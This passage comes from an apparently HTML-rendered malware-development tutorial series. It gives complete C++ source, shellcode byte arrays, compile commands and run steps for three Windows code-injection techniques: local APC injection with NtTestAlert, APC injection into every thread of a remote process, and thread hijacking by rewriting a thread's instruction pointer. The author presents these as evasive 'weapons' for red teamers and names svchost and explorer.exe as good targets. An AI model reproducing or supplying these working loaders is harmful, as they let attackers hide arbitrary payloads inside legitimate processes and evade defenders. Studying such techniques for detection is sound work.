+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+int main(int argc, char* argv[]) {
+SIZE_T my_payload_len = sizeof(my_payload);
+HMODULE hNtdll = GetModuleHandleA("ntdll");
+myNtTestAlert testAlert = (myNtTestAlert)(
+GetProcAddress(hNtdll, "NtTestAlert"));
+LPVOID my_payload_mem = VirtualAlloc(NULL, my_payload_len,
+MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+WriteProcessMemory(GetCurrentProcess(),
+my_payload_mem, my_payload,
+my_payload_len, NULL);
+PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)
+my_payload_mem;
+
+QueueUserAPC(
+(PAPCFUNC)apcRoutine,
+GetCurrentThread(), NULL
+);
+testAlert();
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For simplicity, we use 64-bit calc.exe as the payload. The flow of this technique is simple. Firstly, we allocate memory in the local process for our payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then write our payload to newly allocated memory:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then queue an APC to the current thread:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Finally, call NtTestAlert:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our code: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And run on victim machine (Windows 7 x64 in my case):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And If open our hack.exe malware in Ghidra:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">the NtTestAlert function call is not suspicious. So the advantage of this technique is that it does not rely on <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateThread</code> or <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> API calls which are more popular and suspicious and which is more closely investigated by the blue teamers. APC MSDN <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">QueueUserAPC</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAlloc</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetModuleHandleA</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">GetProcAddress</code> APC technique MITRE ATT&CK NTAPI Undocumented Functions - NtTestAlert Ghidra - NSA Source Code in Github I hope this section spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">APC injection via alertable threads. Simple C++ malware.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Today I will discuss about simplest APC injection technique. I’m going to talk about APC injection in remote threads. In the simplest way, inject APC into all of the target process threads, as there is no function to find if a thread is alertable or not and we can assume one of the threads is alertable and run our APC job. example The flow is this technique is simple:</p>
+<div class="my-3 space-y-2"><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Find the target process id</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Allocate space in the target process for our payload</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Write payload in the allocated space.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Find target process threads</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Queue an APC to all of them to execute our payload</span></div></div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">For the first step, we need to find the process id of our target process. For this I used a function from my past section about find process:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The full source code of this function: int findMyProc(const char *procname) {</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+Then, allocate space in the target process for our payload:</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, we should allocate this location with PAGE_EXECUTE_READWRITE permissions which is meaning execute, read and write. In the next step, we write our payload to allocated memory:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then find target process threads. For this I wrote another function getTids:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">which finds all threads by process PID. We enum all threads and if the thread belongs to our target process we push it to our tids vector. Then queue an APC to all threads to execute our payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see we queue an APC to the thread using the <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">QueueUserAPC</code> function. the first parameter should be a pointer to the function that we want to execute which is a pointer to my payload and the second parameter is a handle to the remote thread. Let’s take a look at full C++ source code of our malware:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+APC injection via Queue an APC into all the threads
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/2021/11/22/malware-injection-5.html
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;vector&gt;
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+unsigned int my_payload_len = sizeof(my_payload);
+// get process PID
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+// find process threads by PID
+DWORD getTids(DWORD pid, std::vector&lt;DWORD&gt;&amp; tids) {
+HANDLE hSnapshot;
+THREADENTRY32 te;
+te.dwSize = sizeof(THREADENTRY32);
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+if (Thread32First(hSnapshot, &amp;te)) {
+do {
+if (pid == te.th32OwnerProcessID) {
+tids.push_back(te.th32ThreadID);
+}
+} while (Thread32Next(hSnapshot, &amp;te));
+}
+CloseHandle(hSnapshot);
+return !tids.empty();
+}
+
+int main(int argc, char* argv[]) {
+DWORD pid = 0; // process ID
+HANDLE ph; // process handle
+HANDLE ht; // thread handle
+LPVOID rb; // remote buffer
+std::vector&lt;DWORD&gt; tids; // thread IDs
+pid = findMyProc(argv[1]);
+if (pid == 0) {
+printf("PID not found :( exiting...\n");
+return -1;
+} else {
+printf("PID = %d\n", pid);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
+if (ph == NULL) {
+printf("OpenProcess failed! exiting...\n");
+return -2;
+}
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL,
+my_payload_len,
+MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+// write payload to memory buffer
+WriteProcessMemory(ph, rb,
+my_payload,
+my_payload_len, NULL);
+if (getTids(pid, tids)) {
+for (DWORD tid : tids) {
+HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);
+if (ht) {
+QueueUserAPC((PAPCFUNC)rb, ht, NULL);
+printf("payload injected via QueueUserAPC\n");
+CloseHandle(ht);
+}
+}
+}
+CloseHandle(ph);
+}
+return 0;
+
+}
+As usually, for simplicity, we use 64-bit calc.exe as the payload and print message for
+demonstration.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our code: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then firstly run mspaint.exe on victim machine (Windows 7 x64 in my case):</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then run our malware: .\hack.exe mspaint.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see everything is work perfectly. Also perfectly worked on Windows 10 x64:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">But I noticed than on my Windows 7 x64 machine target process is crashed:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">I have not yet figured out why this is happened. The problem with this technique is that it’s unpredictable somehow, and in many cases, it can run our payload multiple times. And as for the target process, I think svchost or explorer.exe is good choice as their almost always has alertable threads. APC MSDN <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">QueueUserAPC</code></p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">CreateToolhelp32Snapshot Process32First Process32Next strcmp Taking a Snapshot and Viewing Processes Thread32First Thread32Next CloseHandle <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> Source code in Github</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">16. code injection via thread hijacking. Simple C++ malware.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">what does it mean? Today I will discuss about code injection to remote process via thread hijacking. This is about code injection via hijacking threads instead of creating a remote thread. There are methods of code injection where you can create a thread from another process using <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> at an executable code location, I wrote about this here. Or for example, classic DLL Injection via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> and executing <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">LoadLibrary</code>, passing an argument in the <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code>. My post about this technique. example Let’s go to look an example which demonstrates this technique:</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+code injection via thread hijacking
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/11/23/malware-injection-6.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+unsigned char my_payload[] = {
+0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00,
+0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2,
+0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
+
+0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7,
+0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c,
+0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
+0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52,
+0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
+0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
+0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49,
+0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34,
+0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
+0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0,
+0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1,
+0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
+0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
+0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41,
+0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
+0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0,
+0x58, 0x41, 0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff,
+0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
+0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00,
+0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0,
+0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
+0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80,
+0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,
+0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c,
+0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
+};
+unsigned int my_payload_len = sizeof(my_payload);
+// get process PID
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+int main(int argc, char* argv[]) {
+DWORD pid = 0; // process ID
+HANDLE ph; // process handle
+HANDLE ht; // thread handle
+LPVOID rb; // remote buffer
+HANDLE hSnapshot;
+THREADENTRY32 te;
+CONTEXT ct;
+pid = findMyProc(argv[1]);
+if (pid == 0) {
+printf("PID not found :( exiting...\n");
+return -1;
+} else {
+printf("PID = %d\n", pid);
+ct.ContextFlags = CONTEXT_FULL;
+te.dwSize = sizeof(THREADENTRY32);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
+if (ph == NULL) {
+printf("OpenProcess failed! exiting...\n");
+return -2;
+}
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, my_payload_len,
+
+MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+// write payload to memory buffer
+WriteProcessMemory(ph, rb, my_payload,
+my_payload_len, NULL);
+// find thread ID for hijacking
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
+if (Thread32First(hSnapshot, &amp;te)) {
+do {
+if (pid == te.th32OwnerProcessID) {
+ht = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
+break;
+}
+} while (Thread32Next(hSnapshot, &amp;te));
+}
+// suspend target thread
+SuspendThread(ht);
+GetThreadContext(ht, &amp;ct);
+// update register (RIP)
+ct.Rip = (DWORD_PTR)rb;
+SetThreadContext(ht, &amp;ct);
+ResumeThread(ht);
+CloseHandle(ph);
+}
+return 0;
+}</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As usually, for simplicity, we use 64-bit calc.exe as the payload. As you can see, for finding process by name I used a function findMyProc from my past post. Then, the main function is like my code from this post about “classic” code injection to remote process. The only difference in logic: we hijack remote thread instead creating new one. The flow is this technique is: firstly, we find the target process:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, as usually, allocate space in the target process for our payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">and write our payload in the allocated space:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The next step we find a thread ID of the thread we want to hijack in the target process. In our case, we will fetch the thread ID of the first thread in our target process. We will leverage CreateToolhelp32Snapshot to create a snapshot of target process’s</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">threads and enum them with Thread32Next. This will give us the thread ID we will be hijacking:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, suspend the target thread which we want to hijack:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">After that, getting the context of the target thread:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Update the target thread’s register RIP (instruction pointer on 64-bit) to point to our</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">payload:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">But there are the caveat, which is called “SetThreadContext anomaly”. For some processes, the volatile registers (RAX, RCX, RDX, R8-R11) are set by SetThreadContext, for other processes (e.g. Explorer, Edge) they are ignored. Best not rely on SetThreadContext to set those registers. Commit the hijacked thread:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">And in the next step resume hijacked thread:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, it’s not so difficult. Let’s go to compile this malware code: x86_64-w64-mingw32-g++ -O2 hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive >/dev/null 2>&1</p>
